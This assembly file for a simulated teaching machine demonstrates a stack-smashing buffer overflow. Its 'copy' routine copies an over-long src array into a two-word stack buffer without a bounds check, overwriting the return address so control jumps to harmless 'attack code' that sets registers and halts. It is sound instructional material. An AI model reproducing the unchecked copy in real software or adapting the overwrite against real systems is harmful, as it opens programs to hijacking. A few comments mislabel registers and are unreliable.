.pos 0x1000		#code
main:	ld $stackBtm, r5	#r5 = &stackBtm
	inca r5			#allocate space for return address
	gpc $6, r6		#set return address for main
	j copy			#jump to copy
	halt

copy:
	deca r5			#allocate stack space to store return address
	st r6, (r5)		#store return address in stack
	deca r5			#create space for local variable dst[1]
	deca r5			#create stack space for local variable dst[0]
	deca r5			#create space for int i
	ld $0, r4		#r4 = 0
	st r4, 0x8(r5)		#i = 0
	ld $src, r0		#r0 = src
	ld 0x8(r5), r1		#r1 = i
	j loop			#jump to loop

body:	ld $0, r3		#r3 = 0
	st r3, (r5, r1, 4)	#dst[i] = 0
	ld 0xc(r5), r6		#r6 = return address of main
	inca r5			#deallocate stack space	
	inca r5			#deallocate stack space
	inca r5			#deallocate stack space
	ld (r5), r6		#load return address to r6
	inca r5			#deallocate stack
	j (r6)			#jump to return address

loop:	ld (r0, r1, 4), r4	#r0 = src[i]
	beq r4, body		#if(src[i] == 0), branch to next instruction held by r6
	st r4, (r5, r1, 4)	#dst[i] = src[i]
	inc r1			#r1++
	br loop			#branch to loop
	
.pos 0x2000		#data
src:	.long 1
	.long 1
	.long 1		#increase size of src
	.long a		
	.long b
	.long c
	.long d
	.long e
	.long f
	.long g
	.long h
	.long i
	.long j
	

a: ld $-1, r2		#smash attack code
b: ld $-1, r2
c: ld $-1, r3
d: ld $-1, r4
e: ld $-1, r5
f: ld $-1, r6
g: ld $-1, r7
h: ld $-1, r1
i: ld $-1, r0
j: halt


.pos 0x3000
stackTop:        .long 0x00000000
                 .long 0x00000000         
                 .long 0x00000000         
                 .long 0x00000000         
                 .long 0x00000000         
                 .long 0x00000000         
                 .long 0x00000000         
                 .long 0x00000000         
                 .long 0x00000000         
stackBtm:        .long 0x00000000
